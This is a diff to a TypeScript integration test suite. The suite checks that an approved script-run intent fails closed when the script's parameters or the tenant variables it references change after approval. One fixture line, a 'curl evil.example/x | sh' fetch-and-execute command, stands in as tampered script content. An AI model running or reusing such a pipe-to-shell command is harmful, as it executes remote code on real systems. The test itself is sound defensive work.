@@ -43,6 +43,17 @@
  *     only thing anywhere that would go red: it needs the recompute to
  *     actually SEE the unchanged script row.
  *
+ * SINCE #3409 PR4c-1 the digest also pins the script's PARAMETER DEFINITIONS
+ * and a REFERENCE (never a value) to every tenant variable the run will
+ * consult, and this suite is the only place either one meets a real database.
+ * The fixture's script therefore references two real `tenant_variables` rows —
+ * one partner-wide through a `{{var.*}}` content token, one org-owned through
+ * a `tenantVariable`-bound parameter — because a script with no token and null
+ * `parameters` short-circuits `scriptNeedsVariableScope` and loads no scope at
+ * all, which would leave every variable case below asserting against an empty
+ * pinned reference set. `assertFixtureResolvesVariables` re-checks that on
+ * every test so the fixture cannot silently hollow out.
+ *
  * Lives under `src/__tests__/integration/`, already covered by
  * `vitest.integration.config.ts`'s `src/__tests__/integration/**` include
  * glob and by `vitest.config.ts`'s wholesale exclude of the same path — no
@@ -55,6 +66,7 @@ import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 import { randomUUID } from 'crypto';
 import { eq } from 'drizzle-orm';
 import { Hono } from 'hono';
+import type { ScriptParameterDefinition } from '@breeze/shared';
 
 // The ONLY fake in this file: the tool-execution boundary. Everything the
 // feature under test touches — the resolver's SELECT, the effect_digest
@@ -79,8 +91,12 @@ import { getTestDb } from './setup';
 import { actionIntents } from '../../db/schema/actionIntents';
 import { devices } from '../../db/schema/devices';
 import { scripts } from '../../db/schema/scripts';
+import { tenantVariables } from '../../db/schema/tenantVariables';
 import { createActionIntent } from '../../services/actionIntents/intentService';
 import { computeEffectDigest } from '../../services/actionIntents/effectDigest';
+import { buildRunScriptSnapshot } from '../../services/actionIntents/runScriptSnapshot';
+import { encryptTenantVariableValue } from '../../services/tenantVariables';
+import { loadTenantVariableScope, resolveForOrg } from '../../services/tenantVariableResolution';
 import { PERMISSIONS } from '../../services/permissions';
 import { buildOrgAccessClosures, type AuthContext } from '../../middleware/auth';
 import { createAccessToken, type TokenPayload } from '../../services/jwt';
@@ -107,8 +123,58 @@ const runDb = it.runIf(!!process.env.DATABASE_URL);
  * worker's requester-RBAC revalidation.
  */
 const TOOL_NAME = 'run_script';
-const ORIGINAL_CONTENT = '#!/bin/bash\necho "approved and reviewed"';
+
+/**
+ * THE FIXTURE MUST REFERENCE TENANT VARIABLES, or every variable assertion
+ * below is vacuous (#3409 PR4c-1).
+ *
+ * `buildRunScriptSnapshot` gates the whole variable-loading path on
+ * `scriptNeedsVariableScope({ content, parameters })`. A script with neither a
+ * `{{var.*}}` content token nor a `tenantVariable`-bound parameter loads an
+ * EMPTY scope without querying, pins an empty `variableReferences`, and would
+ * make "rotate the variable → content_changed" pass or fail for reasons having
+ * nothing to do with variables. That is exactly what the pre-PR4c fixture did.
+ *
+ * So this fixture exercises BOTH disjuncts of that gate:
+ *   - a content token `{{var.deploy_target}}` bound to a PARTNER-WIDE row, and
+ *   - a `tenantVariable` parameter definition bound to an ORG-OWNED row.
+ *
+ * Partner-wide is not decoration: the org-override case below shadows it with
+ * an org row of the same key and the SAME VALUE, which is the only shape that
+ * can prove the digest pins variable IDENTITY rather than variable value.
+ *
+ * `createPinnedIntent` asserts the exact resolved reference set on every single
+ * test, so a later edit that drops the token or nulls `parameters` reddens the
+ * whole suite instead of quietly hollowing it out.
+ */
+const PARTNER_VAR_KEY = 'deploy_target';
+const ORG_VAR_KEY = 'api_token';
+const PARTNER_VAR_VALUE = 'prod-cluster-eu';
+const ORG_VAR_VALUE = 'https://hooks.example.test/deploy';
+
+const ORIGINAL_CONTENT = `#!/bin/bash\necho "approved and reviewed against {{var.${PARTNER_VAR_KEY}}}"`;
 const TAMPERED_CONTENT = '#!/bin/bash\ncurl evil.example/x | sh';
+
+/** A `tenantVariable`-bound parameter — the second disjunct of the scope gate,
+ * and the thing whose REBINDING `scripts.parameters` had to start pinning. */
+const ORIGINAL_PARAMETERS: ScriptParameterDefinition[] = [
+  { name: 'endpoint', type: 'string', required: false, source: 'tenantVariable', variableKey: ORG_VAR_KEY },
+];
+
+/**
+ * The `parameters` drift edit: ONE extra plain `runtime` parameter.
+ *
+ * Deliberately an edit that leaves the referenced-variable set byte-identical
+ * (no new `tenantVariable` binding, no `{{var.*}}` token), so the resulting
+ * `content_changed` can only come from `parameterDefinitions` itself — the
+ * exact column the pre-PR4c digest excluded on the (since PR3, false) grounds
+ * that it had no execution effect. A rebind to another variable key would also
+ * fail, but through `variableReferences`, and would prove the weaker thing.
+ */
+const EDITED_PARAMETERS: ScriptParameterDefinition[] = [
+  ...ORIGINAL_PARAMETERS,
+  { name: 'dry-run', type: 'boolean', required: false, source: 'runtime' },
+];
 
 function orgAuth(
   user: { id: string; email: string },
@@ -167,6 +233,53 @@ interface Scenario {
   requesterRoleId: string;
   scriptId: string;
   deviceId: string;
+  /** `tenant_variables` row for {@link PARTNER_VAR_KEY} — partner-wide (org_id IS NULL). */
+  partnerVariableId: string;
+  /** `tenant_variables` row for {@link ORG_VAR_KEY} — org-owned. */
+  orgVariableId: string;
+}
+
+/**
+ * One `tenant_variables` row, sealed through the service's own
+ * `encryptTenantVariableValue`.
+ *
+ * The id is generated HERE, before the insert, because the AAD binds the
+ * ciphertext to `tenant_variables.value:<row id>` — a plaintext literal (or a
+ * ciphertext sealed under a different id) fails to decrypt at resolution time,
+ * silently drops the row out of the scope, and would turn every `present`
+ * reference below into an `unreadable` one.
+ */
+async function insertVariable(options: {
+  orgId?: string | null;
+  partnerId?: string | null;
+  key: string;
+  value: string;
+  isSecret?: boolean;
+}): Promise<string> {
+  const id = randomUUID();
+  await getTestDb()
+    .insert(tenantVariables)
+    .values({
+      id,
+      orgId: options.orgId ?? null,
+      partnerId: options.partnerId ?? null,
+      key: options.key,
+      value: encryptTenantVariableValue(id, options.value),
+      isSecret: options.isSecret ?? false,
+    });
+  return id;
+}
+
+async function readVariable(id: string) {
+  const [row] = await getTestDb().select().from(tenantVariables).where(eq(tenantVariables.id, id)).limit(1);
+  return row!;
+}
+
+/** The resolved value an org sees for a key, straight through the production
+ * resolver — used to prove the org-override case changed IDENTITY only. */
+async function resolvedValueFor(orgId: string, key: string): Promise<string | undefined> {
+  const scope = await loadTenantVariableScope([orgId]);
+  return resolveForOrg(scope, orgId).get(key)?.value;
 }
 
 /**
@@ -204,6 +317,9 @@ async function seedScenario(): Promise<Scenario> {
       osTypes: ['linux'],
       language: 'bash',
       content: ORIGINAL_CONTENT,
+      // Not null, and not decoration: `parameters` is the second disjunct of
+      // the variable-scope gate AND is itself pinned since #3409 PR4c-1.
+      parameters: ORIGINAL_PARAMETERS,
       runAs: 'user',
       timeoutSeconds: 300,
     })
@@ -226,6 +342,20 @@ async function seedScenario(): Promise<Scenario> {
     })
     .returning({ id: devices.id });
 
+  // The two rows the script actually references. Partner-wide for the content
+  // token (so an org override can shadow it later), org-owned for the bound
+  // parameter.
+  const partnerVariableId = await insertVariable({
+    partnerId: partner.id,
+    key: PARTNER_VAR_KEY,
+    value: PARTNER_VAR_VALUE,
+  });
+  const orgVariableId = await insertVariable({
+    orgId: org.id,
+    key: ORG_VAR_KEY,
+    value: ORG_VAR_VALUE,
+  });
+
   return {
     partnerId: partner.id,
     orgId: org.id,
@@ -233,6 +363,8 @@ async function seedScenario(): Promise<Scenario> {
     requesterRoleId: role.id,
     scriptId: script!.id,
     deviceId: device!.id,
+    partnerVariableId,
+    orgVariableId,
   };
 }
 
@@ -263,11 +395,63 @@ async function createPinnedIntent(s: Scenario): Promise<{ intentId: string; appr
   // and the whole suite goes red instead of silently passing.
   expect(row.effectDigest).toMatch(/^[0-9a-f]{64}$/);
 
+  await assertFixtureResolvesVariables(s);
+
   return {
     intentId: snapshot.id,
     approvalRowId: snapshot.requesterApprovalRequestId!,
     digest: row.effectDigest!,
   };
+}
+
+/**
+ * THE ANTI-VACUITY GUARD. Every variable case below is a "change one thing,
+ * expect content_changed" test, and every one of them would pass for the wrong
+ * reason — or fail to distinguish anything at all — if the digest had pinned an
+ * EMPTY reference set to begin with.
+ *
+ * So this asserts the exact set, on every test, through the same
+ * `buildRunScriptSnapshot` the digest is computed from: two `present`
+ * references, resolved from the two REAL rows, carrying the identity fields
+ * (`variableId`, `version`, `isSecret`, `ownerScope`) that the drift cases each
+ * perturb one of. Sorted by (orgId, key), so `api_token` precedes
+ * `deploy_target` by code point.
+ *
+ * A regression that removes the `{{var.*}}` token, nulls `parameters`, or
+ * short-circuits `scriptNeedsVariableScope` reddens here with a concrete diff,
+ * rather than leaving six green tests that prove nothing.
+ */
+async function assertFixtureResolvesVariables(s: Scenario): Promise<void> {
+  const built = await withSystemDbAccessContext(() =>
+    buildRunScriptSnapshot({ scriptId: s.scriptId, deviceIds: [s.deviceId] }, db),
+  );
+  expect(built.kind).toBe('snapshot');
+  if (built.kind !== 'snapshot') return;
+  expect(built.snapshot.variableReferences).toEqual([
+    {
+      orgId: s.orgId,
+      key: ORG_VAR_KEY,
+      state: 'present',
+      variableId: s.orgVariableId,
+      version: 1,
+      isSecret: false,
+      ownerScope: 'organization',
+    },
+    {
+      orgId: s.orgId,
+      key: PARTNER_VAR_KEY,
+      state: 'present',
+      variableId: s.partnerVariableId,
+      version: 1,
+      isSecret: false,
+      ownerScope: 'partner',
+    },
+  ]);
+  // And the values really did decrypt — an AAD mismatch would present as
+  // `unreadable` above, but assert it directly so the failure names the cause.
+  const resolved = resolveForOrg(built.scope, s.orgId);
+  expect(resolved.get(PARTNER_VAR_KEY)?.value).toBe(PARTNER_VAR_VALUE);
+  expect(resolved.get(ORG_VAR_KEY)?.value).toBe(ORG_VAR_VALUE);
 }
 
 async function approveViaRoute(s: Scenario, approvalRowId: string): Promise<Response> {
@@ -291,8 +475,43 @@ async function readIntent(intentId: string) {
 /** A genuine post-approval edit by some other actor, through the superuser
  * client (no request context, mirroring "somebody edited it in the UI while
  * the intent sat approved"). */
-async function editScript(scriptId: string, patch: Partial<{ content: string; runAs: 'system' | 'user' | 'elevated' }>) {
+async function editScript(
+  scriptId: string,
+  patch: Partial<{
+    content: string;
+    runAs: 'system' | 'user' | 'elevated';
+    parameters: ScriptParameterDefinition[];
+  }>,
+) {
   await getTestDb().update(scripts).set(patch).where(eq(scripts.id, scriptId));
+}
+
+/**
+ * pin → approve → let `drift` happen → release. The six #3409 PR4c-1 cases
+ * differ ONLY in `drift`, so the ladder is written once: an inlined copy per
+ * case is where a missing "did it actually reach `approved`?" check hides, and
+ * an intent that never got approved fails release for an unrelated reason
+ * while still landing on `failed`.
+ */
+async function approveThenDriftThenRelease(s: Scenario, drift: () => Promise<void>) {
+  const { intentId, approvalRowId, digest } = await createPinnedIntent(s);
+  expect((await approveViaRoute(s, approvalRowId)).status).toBe(200);
+  expect((await readIntent(intentId)).status).toBe('approved');
+
+  await drift();
+
+  await releaseApprovedIntent(intentId);
+  return { released: await readIntent(intentId), pinnedDigest: digest };
+}
+
+/** Fail CLOSED: the intent is `failed`/`content_changed`, nothing executed, and
+ * `executedAt` stays null (the reaper's "never ran" vs "ran and we lost the
+ * result" discriminator). */
+function expectFailedClosed(released: Awaited<ReturnType<typeof readIntent>>) {
+  expect(released.status).toBe('failed');
+  expect(released.errorCode).toBe('content_changed');
+  expect(released.executedAt).toBeNull();
+  expect(h.executeTool).not.toHaveBeenCalled();
 }
 
 let seeded: Scenario | null = null;
@@ -354,6 +573,169 @@ describe('effect-digest TOCTOU chain (real Postgres, real resolver, real release
     expect(h.executeTool).not.toHaveBeenCalled();
   });
 
+  // ---------------------------------------------------------------------
+  // #3409 PR4c-1: the digest pins the script's PARAMETER DEFINITIONS and a
+  // REFERENCE to every tenant variable the run will consult. Each case below
+  // perturbs exactly one of those and nothing else — the script body, the
+  // run_as, the device set and the intent's own arguments stay byte-identical
+  // throughout, so `argument_digest` and the pre-PR4c five-field effect digest
+  // are both blind to every one of them.
+  // ---------------------------------------------------------------------
+
+  // ROTATION. The operator changes the variable's value; the service bumps
+  // `version`. The VALUE is deliberately not in the digest material (the
+  // column is widely readable and must never be reconstructible into tenant
+  // plaintext), so `version` is the entire observable — pin it or rotation is
+  // invisible.
+  runDb('a bound tenant variable rotated (value + version bump) after approval → content_changed', async () => {
+    const s = seeded!;
+    const { released } = await approveThenDriftThenRelease(s, async () => {
+      const before = await readVariable(s.orgVariableId);
+      await getTestDb()
+        .update(tenantVariables)
+        .set({
+          value: encryptTenantVariableValue(s.orgVariableId, 'https://hooks.example.test/rotated'),
+          version: before.version + 1,
+        })
+        .where(eq(tenantVariables.id, s.orgVariableId));
+      const after = await readVariable(s.orgVariableId);
+      // The drift really happened, and it is a version bump — not a no-op
+      // UPDATE that would make the assertion below meaningless.
+      expect(after.version).toBe(before.version + 1);
+    });
+
+    expectFailedClosed(released);
+  });
+
+  // RECLASSIFICATION. `isSecret` flipping false → true changes how the value
+  // reaches the device (redacted env delivery instead of inline substitution),
+  // and NOTHING else about the row moves: same id, same version, same
+  // ciphertext. A digest that pinned `{variableId, version}` alone — the shape
+  // the schema comment originally described — releases this happily.
+  runDb('isSecret flipped on a bound variable WITHOUT a version bump → content_changed', async () => {
+    const s = seeded!;
+    const { released } = await approveThenDriftThenRelease(s, async () => {
+      const before = await readVariable(s.orgVariableId);
+      expect(before.isSecret).toBe(false);
+      await getTestDb()
+        .update(tenantVariables)
+        .set({ isSecret: true })
+        .where(eq(tenantVariables.id, s.orgVariableId));
+
+      const after = await readVariable(s.orgVariableId);
+      expect(after.isSecret).toBe(true);
+      // THE WHOLE POINT of this case: everything a version-only pin would
+      // have looked at is unchanged. If a trigger (or a future service
+      // change) ever starts bumping version on an isSecret flip, this test
+      // silently degenerates into a duplicate of the rotation case above —
+      // so assert it, rather than assume it.
+      expect(after.version).toBe(before.version);
+      expect(after.value).toBe(before.value);
+      expect(after.key).toBe(before.key);
+    });
+
+    expectFailedClosed(released);
+  });
+
+  // IDENTITY, NOT VALUE. An org override with the SAME key and the SAME value
+  // as the partner-wide row it shadows. Resolution returns a byte-identical
+  // string before and after — asserted below, so this cannot pass by
+  // accidentally changing the value — yet the run now consults a DIFFERENT
+  // ROW: different `variableId`, `ownerScope` partner → organization. Only a
+  // digest that pins the reference can see this at all.
+  runDb('an org override shadowing a partner-wide variable with the SAME value → content_changed', async () => {
+    const s = seeded!;
+    let overrideId = '';
+    const { released } = await approveThenDriftThenRelease(s, async () => {
+      expect(await resolvedValueFor(s.orgId, PARTNER_VAR_KEY)).toBe(PARTNER_VAR_VALUE);
+
+      overrideId = await insertVariable({
+        orgId: s.orgId,
+        key: PARTNER_VAR_KEY,
+        // Same plaintext, sealed under the new row's own id.
+        value: PARTNER_VAR_VALUE,
+      });
+      expect(overrideId).not.toBe(s.partnerVariableId);
+
+      // The value the run resolves is unchanged; only which row supplied it
+      // moved. A `content_changed` here therefore cannot be attributed to a
+      // value difference — there isn't one.
+      expect(await resolvedValueFor(s.orgId, PARTNER_VAR_KEY)).toBe(PARTNER_VAR_VALUE);
+    });
+
+    expectFailedClosed(released);
+  });
+
+  // DELETION → the `absent` sentinel. The reference set still has an entry for
+  // the key (state `absent`), which is why deletion is detectable at all: a
+  // resolver that simply omitted missing keys would shrink the list to the
+  // remaining reference and, for a single-variable script, back to `[]` —
+  // indistinguishable from a script that never referenced anything.
+  runDb('a bound tenant variable deleted after approval → content_changed', async () => {
+    const s = seeded!;
+    const { released } = await approveThenDriftThenRelease(s, async () => {
+      await getTestDb().delete(tenantVariables).where(eq(tenantVariables.id, s.orgVariableId));
+      expect(await resolvedValueFor(s.orgId, ORG_VAR_KEY)).toBeUndefined();
+    });
+
+    expectFailedClosed(released);
+  });
+
+  // THE PRE-EXISTING DRIFT BUG. `scripts.parameters` was excluded from the
+  // digest on the stated grounds that the handler passes the tool call's own
+  // `input.parameters` and never reads the column — true until #3409 PR3 made
+  // the column drive `scriptNeedsVariableScope` and every `tenantVariable`
+  // binding at dispatch. This case was RED before the column was pinned.
+  //
+  // The edit adds one plain `runtime` parameter, so the referenced-variable
+  // set is provably untouched (asserted) and `parameterDefinitions` is the
+  // only thing that moved.
+  runDb('the script\'s parameters column edited after approval → content_changed', async () => {
+    const s = seeded!;
+    const { released } = await approveThenDriftThenRelease(s, async () => {
+      const before = await withSystemDbAccessContext(() =>
+        buildRunScriptSnapshot({ scriptId: s.scriptId, deviceIds: [s.deviceId] }, db),
+      );
+      await editScript(s.scriptId, { parameters: EDITED_PARAMETERS });
+      const after = await withSystemDbAccessContext(() =>
+        buildRunScriptSnapshot({ scriptId: s.scriptId, deviceIds: [s.deviceId] }, db),
+      );
+
+      if (before.kind !== 'snapshot' || after.kind !== 'snapshot') throw new Error('snapshot did not build');
+      // Isolation: the variable references and the script body are identical
+      // across the edit, so the release below can only fail on the parameter
+      // definitions.
+      expect(after.snapshot.variableReferences).toEqual(before.snapshot.variableReferences);
+      expect(after.snapshot.script).toEqual(before.snapshot.script);
+      expect(after.snapshot.parameterDefinitions).not.toBe(before.snapshot.parameterDefinitions);
+    });
+
+    expectFailedClosed(released);
+  });
+
+  // The variable-side negative mirror. Its twin below covers the script row;
+  // this one covers the variables, and is what would go red if the reference
+  // set were nondeterministic across the two computations — an unstable sort,
+  // a `localeCompare` creeping back in, or a resolution that depends on which
+  // DB context happens to be ambient (creation runs inside the intent
+  // transaction, release inside the worker's own system context). Every
+  // failure-case above would stay green under that bug; this one would not.
+  runDb('variables untouched → the digest still matches and the release executes normally', async () => {
+    const s = seeded!;
+    const { intentId, approvalRowId, digest } = await createPinnedIntent(s);
+    expect((await approveViaRoute(s, approvalRowId)).status).toBe(200);
+
+    // No drift at all — the whole point.
+    await releaseApprovedIntent(intentId);
+
+    const released = await readIntent(intentId);
+    expect(released.status).toBe('completed');
+    expect(released.errorCode).toBeNull();
+    expect(released.executedAt).not.toBeNull();
+    expect(h.executeTool).toHaveBeenCalledTimes(1);
+    expect(released.effectDigest).toBe(digest);
+  });
+
   // The negative mirror, and the ONLY coverage anywhere of the
   // `withSystemDbAccessContext` wrap around the release-time recompute:
   // delete that wrap and the resolver's read is RLS-filtered to zero rows,
@@ -372,10 +754,32 @@ describe('effect-digest TOCTOU chain (real Postgres, real resolver, real release
     expect(released.errorCode).toBeNull();
     expect(released.executedAt).not.toBeNull();
     expect(h.executeTool).toHaveBeenCalledTimes(1);
+    // FOUR arguments since #3409 PR4c-1: the worker hands dispatch the
+    // `ToolExecutionContext` carrying the VERY observation the recompute just
+    // compared, instead of letting the handler re-read the script and
+    // re-resolve the variables (which would reopen the check/use window the
+    // digest exists to close). Asserting the 4th argument — not
+    // `expect.anything()` — is what makes that hand-off a tested property:
+    // drop the `{ context }` and this goes red.
     expect(h.executeTool).toHaveBeenCalledWith(
       TOOL_NAME,
       expect.objectContaining({ scriptId: s.scriptId }),
       expect.anything(),
+      expect.objectContaining({
+        context: expect.objectContaining({
+          verifiedRunScript: expect.objectContaining({
+            scriptRow: expect.objectContaining({ id: s.scriptId, content: ORIGINAL_CONTENT }),
+            snapshot: expect.objectContaining({
+              // The same variable references the digest was pinned over reach
+              // dispatch — one observation, not two.
+              variableReferences: [
+                expect.objectContaining({ key: ORG_VAR_KEY, variableId: s.orgVariableId, state: 'present' }),
+                expect.objectContaining({ key: PARTNER_VAR_KEY, variableId: s.partnerVariableId, state: 'present' }),
+              ],
+            }),
+          }),
+        }),
+      }),
     );
     // The stored digest is unchanged by a successful release — it is a
     // creation-time pin, never rewritten.
